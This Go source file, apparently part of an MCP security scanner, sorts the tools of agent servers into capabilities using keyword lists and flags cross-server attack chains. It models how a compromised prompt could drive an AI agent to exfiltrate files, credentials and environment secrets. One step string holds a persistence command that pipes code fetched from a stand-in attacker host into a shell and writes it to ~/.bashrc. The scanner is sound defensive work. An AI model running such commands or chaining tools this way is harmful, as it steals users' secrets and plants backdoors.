// Package attackpath analyzes cross-server attack chain potential across a set of
// inspected MCP servers. It identifies dangerous capability combinations that together
// form a complete attack sequence even when no single server appears malicious in isolation.
//
// Example: a "filesystem" server (read_file) paired with a "fetch" server (http_post)
// gives any compromised prompt the ability to exfiltrate any readable file to an
// external URL — even though each server individually looks benign.
package attackpath

import (
	"sort"
	"strings"

	"github.com/aspex-security/aspex/internal/inspect"
)

// Capability is a broad category of what one or more tools can accomplish.
type Capability uint32

const (
	CapNone         Capability = 0
	CapReadFile     Capability = 1 << iota // read arbitrary files
	CapWriteFile                           // create or modify files
	CapShellExec                           // execute arbitrary commands
	CapNetworkSend                         // make outbound HTTP/network calls
	CapCredentialRead                      // access credentials, tokens, secrets
	CapPersistence                         // write to startup/autorun locations
	CapPackageInstall                      // install packages or dependencies
	CapReadEnv                             // read environment variables
	CapDatabaseWrite                       // write to a database
	CapEmailSend                           // send email or notifications
)

// String returns a short human label for a capability (implements fmt.Stringer).
func (c Capability) String() string { return capabilityName(c) }

// capabilityName returns a short human label for a capability.
func capabilityName(c Capability) string {
	switch c {
	case CapReadFile:
		return "file-read"
	case CapWriteFile:
		return "file-write"
	case CapShellExec:
		return "shell-exec"
	case CapNetworkSend:
		return "network-send"
	case CapCredentialRead:
		return "credential-read"
	case CapPersistence:
		return "persistence-write"
	case CapPackageInstall:
		return "package-install"
	case CapReadEnv:
		return "env-read"
	case CapDatabaseWrite:
		return "db-write"
	case CapEmailSend:
		return "email-send"
	}
	return "unknown"
}

// ServerCapabilities holds the detected capabilities for one MCP server.
type ServerCapabilities struct {
	ServerName   string
	Client       string
	Caps         Capability
	CapTools     map[Capability][]string // capability -> contributing tool names
}

// Has returns true if this server has the given capability.
func (sc *ServerCapabilities) Has(c Capability) bool { return sc.Caps&c != 0 }

// AttackChain describes a dangerous combination of capabilities across servers.
type AttackChain struct {
	Name        string   // "Data Exfiltration"
	Severity    string   // "critical" | "high" | "medium"
	Description string   // human-readable narrative of the attack
	MITRETactic string   // MITRE ATT&CK tactic name
	MITRERef    string   // MITRE ATT&CK reference ID
	Servers     []string // server names involved
	Steps       []string // ordered narrative steps
}

// Analyze detects capabilities and attack chains across all inspected servers.
// It returns the per-server capability map and a deduplicated list of attack chains.
func Analyze(servers []*inspect.Server) ([]ServerCapabilities, []AttackChain) {
	caps := make([]ServerCapabilities, 0, len(servers))
	for _, srv := range servers {
		sc := detectCapabilities(srv)
		caps = append(caps, sc)
	}

	chains := detectChains(caps)
	return caps, chains
}

// detectCapabilities classifies all tools of one server into capability buckets.
func detectCapabilities(srv *inspect.Server) ServerCapabilities {
	sc := ServerCapabilities{
		ServerName: srv.Entry.Name,
		Client:     srv.Entry.Client,
		CapTools:   make(map[Capability][]string),
	}

	for _, tool := range srv.Tools {
		combined := strings.ToLower(tool.Name + " " + tool.Description)
		name := strings.ToLower(tool.Name)

		check := func(cap Capability, patterns []string) {
			for _, p := range patterns {
				if strings.Contains(combined, p) {
					sc.Caps |= cap
					sc.CapTools[cap] = appendUniq(sc.CapTools[cap], tool.Name)
					break
				}
			}
		}

		check(CapReadFile, []string{
			"read_file", "read file", "get_file", "fetch_file", "cat ", "view_file",
			"open_file", "file_read", "readfile", "get_contents", "file content",
			"list_directory", "list_files", "directory listing",
		})
		check(CapWriteFile, []string{
			"write_file", "write file", "write_to_file", "create_file", "edit_file",
			"modify_file", "update_file", "delete_file", "append_file",
			"file_write", "writefile", "patch_file", "apply_diff", "insert_content",
		})
		check(CapShellExec, []string{
			"execute_command", "run_command", "shell_exec", "bash_exec", "terminal",
			"eval_code", "run_code", "execute_code", "code_interpreter", "run_python",
			"run_javascript", "spawn_process", "exec ", "system_call",
		})
		check(CapNetworkSend, []string{
			"http_post", "http_put", "http_request", "fetch_url", "send_request",
			"web_request", "make_request", "call_api", "post_data", "send_webhook",
			"slack_send", "discord_send", "teams_send", "notify", "upload",
		})
		// also catch generic "fetch" and "http_get" that can be used to send data via query params
		if strings.Contains(name, "fetch") || strings.Contains(name, "http") || strings.Contains(name, "request") {
			sc.Caps |= CapNetworkSend
			sc.CapTools[CapNetworkSend] = appendUniq(sc.CapTools[CapNetworkSend], tool.Name)
		}
		check(CapCredentialRead, []string{
			"credential", "get_secret", "read_secret", "fetch_secret",
			"get_token", "get_api_key", "get_password", "env_var", "environment_variable",
			"aws_credentials", "gcp_credentials", "azure_credentials",
			"private_key", "ssh_key",
		})
		check(CapPersistence, []string{
			"cron", "startup", "autorun", "launchagent", "systemd", "init_script",
			"rc.local", "bash_profile", "bashrc", "zshrc", "profile",
			"registry_run", "schedule_task",
		})
		check(CapPackageInstall, []string{
			"npm_install", "pip_install", "brew_install", "apt_install",
			"install_package", "add_dependency", "package_manager",
		})
		check(CapReadEnv, []string{
			"get_env", "read_env", "env_vars", "environment", "getenv",
			"list_env", "show_env",
		})
		check(CapDatabaseWrite, []string{
			"db_write", "sql_execute", "insert_record", "update_record", "delete_record",
			"query_execute", "database_write", "run_query",
		})
		check(CapEmailSend, []string{
			"send_email", "email_send", "smtp_send", "mail_send", "sendmail",
			"compose_email", "reply_email",
		})
	}

	return sc
}

// detectChains identifies dangerous capability combinations across all servers.
func detectChains(caps []ServerCapabilities) []AttackChain {
	var chains []AttackChain
	seen := map[string]bool{}

	// Collect servers by capability for fast lookup.
	byCap := map[Capability][]ServerCapabilities{}
	for _, sc := range caps {
		for bit := Capability(1); bit <= CapEmailSend; bit <<= 1 {
			if sc.Has(bit) {
				byCap[bit] = append(byCap[bit], sc)
			}
		}
	}

	add := func(chain AttackChain) {
		key := chain.Name + strings.Join(chain.Servers, ",")
		if !seen[key] {
			seen[key] = true
			chains = append(chains, chain)
		}
	}

	// 1. Data exfiltration: file-read + network-send
	for _, reader := range byCap[CapReadFile] {
		for _, sender := range byCap[CapNetworkSend] {
			servers := dedup(reader.ServerName, sender.ServerName)
			add(AttackChain{
				Name:        "Data Exfiltration",
				Severity:    "critical",
				Description: "A compromised prompt can read any file via " + reader.ServerName + " then send its contents to an external URL via " + sender.ServerName + ".",
				MITRETactic: "Exfiltration",
				MITRERef:    "TA0010",
				Servers:     servers,
				Steps: []string{
					reader.ServerName + " provides: " + join(reader.CapTools[CapReadFile]),
					sender.ServerName + " provides: " + join(sender.CapTools[CapNetworkSend]),
					"Combined: attacker reads ~/.*rc, SSH keys, .env files and posts them to attacker-controlled URL",
				},
			})
		}
	}

	// 2. Credential theft: credential-read + network-send
	for _, reader := range byCap[CapCredentialRead] {
		for _, sender := range byCap[CapNetworkSend] {
			servers := dedup(reader.ServerName, sender.ServerName)
			add(AttackChain{
				Name:        "Credential Theft",
				Severity:    "critical",
				Description: "A compromised prompt can read secrets/credentials via " + reader.ServerName + " and exfiltrate them via " + sender.ServerName + ".",
				MITRETactic: "Credential Access",
				MITRERef:    "TA0006",
				Servers:     servers,
				Steps: []string{
					reader.ServerName + " provides: " + join(reader.CapTools[CapCredentialRead]),
					sender.ServerName + " provides: " + join(sender.CapTools[CapNetworkSend]),
					"Combined: attacker extracts API keys, tokens, or cloud credentials and sends them externally",
				},
			})
		}
	}

	// 3. Persistence: shell-exec capable server (or write-file + persistence paths)
	for _, sc := range byCap[CapShellExec] {
		add(AttackChain{
			Name:        "Persistence via Shell",
			Severity:    "high",
			Description: sc.ServerName + " can execute arbitrary shell commands, enabling a compromised prompt to write cron jobs, modify shell profiles, or install malware that survives reboot.",
			MITRETactic: "Persistence",
			MITRERef:    "TA0003",
			Servers:     []string{sc.ServerName},
			Steps: []string{
				sc.ServerName + " provides: " + join(sc.CapTools[CapShellExec]),
				"Attacker runs: echo 'curl http://attacker.com/c2 | sh' >> ~/.bashrc",
			},
		})
	}
	for _, sc := range byCap[CapPersistence] {
		add(AttackChain{
			Name:        "Persistence via Startup Write",
			Severity:    "high",
			Description: sc.ServerName + " has tools that write to startup/autorun locations, enabling persistent code execution after reboot.",
			MITRETactic: "Persistence",
			MITRERef:    "TA0003",
			Servers:     []string{sc.ServerName},
			Steps: []string{
				sc.ServerName + " provides: " + join(sc.CapTools[CapPersistence]),
				"Attacker writes malicious script to cron, LaunchAgents, or shell profile",
			},
		})
	}

	// 4. Reverse shell / C2: shell-exec + network-send
	for _, exec := range byCap[CapShellExec] {
		for _, net := range byCap[CapNetworkSend] {
			servers := dedup(exec.ServerName, net.ServerName)
			add(AttackChain{
				Name:        "Command & Control",
				Severity:    "critical",
				Description: "Shell execution via " + exec.ServerName + " combined with outbound network access via " + net.ServerName + " enables a reverse shell or C2 beacon.",
				MITRETactic: "Command and Control",
				MITRERef:    "TA0011",
				Servers:     servers,
				Steps: []string{
					exec.ServerName + " provides: " + join(exec.CapTools[CapShellExec]),
					net.ServerName + " provides: " + join(net.CapTools[CapNetworkSend]),
					"Combined: attacker establishes persistent command-and-control channel",
				},
			})
		}
	}

	// 5. Environment + network = credential exfil via env
	for _, reader := range byCap[CapReadEnv] {
		for _, sender := range byCap[CapNetworkSend] {
			servers := dedup(reader.ServerName, sender.ServerName)
			add(AttackChain{
				Name:        "Environment Variable Exfiltration",
				Severity:    "high",
				Description: "A compromised prompt can read environment variables (API keys, tokens) via " + reader.ServerName + " and send them out via " + sender.ServerName + ".",
				MITRETactic: "Credential Access",
				MITRERef:    "TA0006",
				Servers:     servers,
				Steps: []string{
					reader.ServerName + " provides: " + join(reader.CapTools[CapReadEnv]),
					sender.ServerName + " provides: " + join(sender.CapTools[CapNetworkSend]),
					"Combined: $AWS_ACCESS_KEY_ID, $GITHUB_TOKEN, $OPENAI_API_KEY sent externally",
				},
			})
		}
	}

	// 6. Email exfil
	for _, reader := range byCap[CapReadFile] {
		for _, mailer := range byCap[CapEmailSend] {
			servers := dedup(reader.ServerName, mailer.ServerName)
			add(AttackChain{
				Name:        "Email Data Exfiltration",
				Severity:    "critical",
				Description: "A compromised prompt can read files via " + reader.ServerName + " and email their contents via " + mailer.ServerName + " to an attacker-controlled address.",
				MITRETactic: "Exfiltration",
				MITRERef:    "TA0010",
				Servers:     servers,
				Steps: []string{
					reader.ServerName + " provides: " + join(reader.CapTools[CapReadFile]),
					mailer.ServerName + " provides: " + join(mailer.CapTools[CapEmailSend]),
					"Combined: attacker emails private keys or source code to external address",
				},
			})
		}
	}

	// Sort: critical first, then by name.
	sort.Slice(chains, func(i, j int) bool {
		si, sj := severityRank(chains[i].Severity), severityRank(chains[j].Severity)
		if si != sj {
			return si > sj
		}
		return chains[i].Name < chains[j].Name
	})

	return chains
}

func severityRank(s string) int {
	switch s {
	case "critical":
		return 3
	case "high":
		return 2
	case "medium":
		return 1
	}
	return 0
}

func dedup(names ...string) []string {
	seen := map[string]bool{}
	var out []string
	for _, n := range names {
		if !seen[n] {
			seen[n] = true
			out = append(out, n)
		}
	}
	return out
}

func appendUniq(s []string, v string) []string {
	for _, existing := range s {
		if existing == v {
			return s
		}
	}
	return append(s, v)
}

func join(s []string) string {
	if len(s) == 0 {
		return "(detected from description)"
	}
	if len(s) > 3 {
		return strings.Join(s[:3], ", ") + " +"
	}
	return strings.Join(s, ", ")
}
